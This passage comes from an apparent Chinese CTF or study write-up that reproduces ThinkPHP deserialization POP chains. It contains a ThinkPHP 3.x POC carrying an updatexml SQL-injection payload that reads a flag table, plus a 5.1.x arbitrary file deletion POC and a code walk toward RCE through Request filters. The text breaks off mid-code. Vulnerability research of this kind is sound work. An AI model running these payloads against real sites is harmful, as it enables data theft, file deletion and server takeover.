);</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>    =&gt; <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&quot;database&quot;</span> =&gt; <span class="string">&quot;mysql&quot;</span>, <span class="comment">// 可换成任何一个存在的库</span></span><br><span class="line">            <span class="string">&quot;hostname&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostport&quot;</span> =&gt; <span class="string">&quot;3306&quot;</span>,</span><br><span class="line">            <span class="string">&quot;charset&quot;</span>  =&gt; <span class="string">&quot;utf8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;root&quot;</span> <span class="comment">// BUU下的密码为root</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Image</span>\<span class="title class_">Driver</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Session</span>\<span class="title class_">Driver</span>\<span class="title class_">Memcache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$img</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;img = <span class="keyword">new</span> <span class="title class_">Memcache</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Session</span>\<span class="title class_">Driver</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handle</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handle = <span class="keyword">new</span> <span class="title class_">Model</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Db</span>\<span class="title class_">Driver</span>\<span class="title class_">Mysql</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$pk</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$db</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;db = <span class="keyword">new</span> <span class="title class_">Mysql</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;pk = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data[<span class="variable language_">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="comment">//前面的查库查表就不在这儿一一写了</span></span><br><span class="line">                <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;mysql.user where updatexml(1,concat(0x7e,substr((select`*`from`flag`),1,30),0x7e),1)#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;1=1&quot;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">Think</span>\<span class="title class_">Image</span>\<span class="title class_">Driver</span>\<span class="title class_">Imagick</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/331aaf9df1ba4aa287f0aa6820bc0ee3.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>更改<strong>substr</strong>截取的值即可获得后半段<strong>flag</strong></p><h1 id="Thinkphp5-1-x"><a href="#Thinkphp5-1-x" class="headerlink" title="Thinkphp5.1.x"></a>Thinkphp5.1.x</h1><p><a href="https://paper.seebug.org/1040/#_2">Thinkphp 反序列化利用链深入分析 (seebug.org)</a></p><h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><strong>composer</strong>一把梭，不会的可参考<a href="https://gh0st-9.github.io/2021/11/26/Windows%E4%B8%8Bphpstudy%E5%AE%89%E8%A3%85composer%E5%8F%8A%E5%85%B6thinkphp%E5%90%84%E7%89%88%E6%9C%AC/">文章</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think=(输入你想要下载的版本) tp5.1(文件夹的名称)</span><br></pre></td></tr></table></figure><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>反序列化漏洞一般是通过多种<strong>魔术方法</strong>的自动调用，从而构造<strong>pop</strong>链，实现<strong>getshell</strong></p><p>一般以<code>__destruct</code>或者<code>__wakeup</code>作为起点。</p><p>全局搜索**__destruct<strong>，最终来到</strong>&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;process&#x2F;pipes&#x2F;Windows.php<strong>下的</strong>__destruct**</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">removeFiles</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>调用了两个函数，跟进<strong>close</strong>函数，最终发现不可控，再跟进<strong>removeFiles</strong>函数</p><p><img src="https://img-blog.csdnimg.cn/aa25c983ce3547ca9272669afe0f8f4a.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_14,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p><strong>$this-&gt;files</strong>可控</p><p><img src="https://img-blog.csdnimg.cn/8fc786012390477b9e19dcbd0a3acc96.png" alt="在这里插入图片描述"></p><p>所以，到这里就可以利用反序列化漏洞执行任意文件删除了</p><p><strong>POC</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = [<span class="string">&#x27;文件路径&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Windows</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>同时，我们注意到在<code>removeFiles()</code>中使用了<code>file_exists</code>对<code>$filename</code>进行处理。</p><p><img src="https://img-blog.csdnimg.cn/0e304a1d943845d891bb31ed6f554c2f.png" alt="在这里插入图片描述"></p><p>跟进<strong>file_exists</strong>函数</p><p><img src="https://img-blog.csdnimg.cn/a892c1d3de7848a99e1f1029eb3764de.png" alt="在这里插入图片描述"></p><p>发现**$filename<strong>会被当做</strong>字符串<strong>处理，所以，当我们令</strong>$filename<strong>为一个对象时，这时就会自动触发</strong>__toString**魔术方法</p><p>接下来全局找**__toString**方法</p><p>跟进到<code>\thinkphp\library\think\model\concern\Conversion.php</code></p><p><img src="https://img-blog.csdnimg.cn/e76c44da7f25459f96c8ca19ebc856d5.png" alt="在这里插入图片描述"></p><p>跟进<strong>toJson</strong>方法</p><p><img src="https://img-blog.csdnimg.cn/80846231122842949c5e5fdeab584978.png" alt="在这里插入图片描述"></p><p>跟进<strong>toArray</strong>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$item</span>       = [];</span><br><span class="line">        <span class="variable">$hasVisible</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;visible <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">list</span>(<span class="variable">$relation</span>, <span class="variable">$name</span>)      = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$val</span>);</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;visible[<span class="variable">$relation</span>][] = <span class="variable">$name</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;visible[<span class="variable">$val</span>] = <span class="literal">true</span>;</span><br><span class="line">                    <span class="variable">$hasVisible</span>          = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;hidden <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">list</span>(<span class="variable">$relation</span>, <span class="variable">$name</span>)     = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$val</span>);</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$relation</span>][] = <span class="variable">$name</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$val</span>] = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 合并关联数据</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$val</span> <span class="keyword">instanceof</span> Model || <span class="variable">$val</span> <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">                <span class="comment">// 关联模型对象</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;visible[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                    <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">visible</span>(<span class="variable">$this</span>-&gt;visible[<span class="variable">$key</span>]);</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;hidden[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                    <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">hidden</span>(<span class="variable">$this</span>-&gt;hidden[<span class="variable">$key</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 关联模型对象</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) || <span class="literal">true</span> !== <span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &#123;</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &amp;&amp; !<span class="variable">$hasVisible</span>) &#123;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 追加属性（必须定义获取器）</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;append)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                    <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelation</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                        <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">                            <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>(<span class="variable">$name</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span> ? <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$name</span>)-&gt;<span class="title function_ invoke__">toArray</span>() : [];</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">                    <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                    <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelation</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                        <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">                            <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>([<span class="variable">$attr</span>]);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span> ? <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>([<span class="variable">$attr</span>])-&gt;<span class="title function_ invoke__">toArray</span>() : [];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$name</span>, <span class="variable">$item</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$item</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其中有用的是这一段</p><p><img src="https://img-blog.csdnimg.cn/d73f0d00ef1b46a6bef0ecb18996e2d1.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_17,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>看到这里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>(<span class="variable">$name</span>);</span><br></pre></td></tr></table></figure><p>其中，如果**$relation<strong>可控，且</strong>visible($name)<strong>可控，那么就可以当作跳板，去调用</strong>visible<strong>或者</strong>__call**方法</p><p>好，现在来看，其中**$this-&gt;append**可控</p><p>先看看能不能绕过所有判断，进入**$relation-&gt;visible($name)**这一步</p><p>调用了<strong>getRelation</strong>,跟进</p><p><img src="https://img-blog.csdnimg.cn/27bf44bd44af40c88a2d3d46cd7fc66b.png?x-ss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_19,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>其中**$this-&gt;relation**可控</p><p>很容易构造返回为空，使得<code>if (!$relation)</code>成立</p><p>跟进<strong>getAttr</strong></p><p><img src="https://img-blog.csdnimg.cn/5b6f760190df4d57ac2860a8bea0446a.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_16,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>跟进<strong>getData</strong></p><p><img src="https://img-blog.csdnimg.cn/a15501a6b2144a3895edb0734adfdf9a.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>其中**$this-&gt;data<strong>可控，</strong>$name<strong>为<code>$this-&gt;append</code>的键名</strong>$key<strong>，可控，所以返回的值可控，所以</strong>$value<strong>可控，所以相当于<code>$relation =$this-&gt;data[$key]</code>,因此</strong>$relation<strong>完全可控，而<code>$relation-&gt;visible($name);</code>中的</strong>$name**是<code>foreach ($this-&gt;append as $key =&gt; $name)</code>中的键值，也是可控的，所以<code>$relation-&gt;visible($name);</code>整个都是可控的</p><p>需要注意的是<strong>Conversion</strong>和<strong>Attribute</strong>这两个类定义的时候都是用的<strong>trait</strong></p><p>所以我们需要找到一个子类同时继承了Attribute类和Conversion类。最终来到<code>\thinkphp\library\think\Model.php</code></p><p><img src="https://img-blog.csdnimg.cn/7719485afeca4b878608b6c429208459.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>然后我们全局寻找<strong>visble</strong>方法，最终发现都不可用</p><p>所以我们需要找一个类，这个类中要没有<strong>visible</strong>方法，且要存在**__call**方法</p><p>来到<code>/thinkphp/library/think/Request.php</code></p><p><img src="https://img-blog.csdnimg.cn/ee72f337de764e68ade6a5b596dab8f7.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>这里发现<strong>call_user_func_array</strong>函数可以利用从而执行<strong>system</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）普通使用：</span><br><span class="line"></span><br><span class="line">           <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$b</span>, <span class="variable">$c</span></span>) </span>&#123;  </span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$b</span>; </span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$c</span>; </span><br><span class="line"></span><br><span class="line">           &#125; </span><br><span class="line"></span><br><span class="line">          <span class="title function_ invoke__">call_user_func_array</span>(<span class="string">&#x27;a&#x27;</span>, <span class="keyword">array</span>(<span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>)); </span><br><span class="line"></span><br><span class="line">          <span class="comment">//输出 1 2</span></span><br><span class="line"></span><br><span class="line">（<span class="number">2</span>）调用类内部的方法：</span><br><span class="line"></span><br><span class="line">         Class ClassA &#123; </span><br><span class="line"></span><br><span class="line">                 <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$b</span>, <span class="variable">$c</span></span>) </span>&#123; </span><br><span class="line"></span><br><span class="line">                  <span class="variable">$a</span> = <span class="variable">$b</span> + <span class="variable">$c</span>; </span><br><span class="line"></span><br><span class="line">                  <span class="keyword">echo</span> <span class="variable">$a</span>; </span><br><span class="line"></span><br><span class="line">                 &#125; </span><br><span class="line"></span><br><span class="line">            &#125; </span><br><span class="line"></span><br><span class="line">          <span class="title function_ invoke__">call_user_func_array</span>(<span class="keyword">array</span>(<span class="string">&#x27;ClassA&#x27;</span>,<span class="string">&#x27;a&#x27;</span>), <span class="keyword">array</span>(<span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>)); </span><br><span class="line"></span><br><span class="line">          <span class="comment">//输出  3 </span></span><br></pre></td></tr></table></figure><p>但是这里的**$method<strong>是前面的</strong>visible<strong>，不可控，而</strong>$args<strong>是之前的</strong>$name<strong>可控，但是<code>array_unshift($args, $this)</code>把<code>$this</code>插入到了<code>$args</code>的最前面，导致</strong>system**不可用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_unshift() 函数用于向数组插入新元素。新数组的值将被插入到数组的开头。</span><br></pre></td></tr></table></figure><p><strong>新思路(变量覆盖)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在Thinkphp的Request类中还有一个filter功能，事实上Thinkphp多个RCE都与这个功能有关。我们可以尝试覆盖filter的方法去执行代码。</span><br></pre></td></tr></table></figure><p>找到<strong>filterValue</strong>函数</p><p><img src="https://img-blog.csdnimg.cn/cf7ca15f141f4b2492dd31d326eb54cd.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>需要利用这里的**$value &#x3D; call_user_func($filter, $value)**，但是<code>$filter</code>和<code>$value</code>都不可控，需要找到可以利用<code>$value</code>的地方。</p><p>最终找到这个类的<strong>input</strong>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 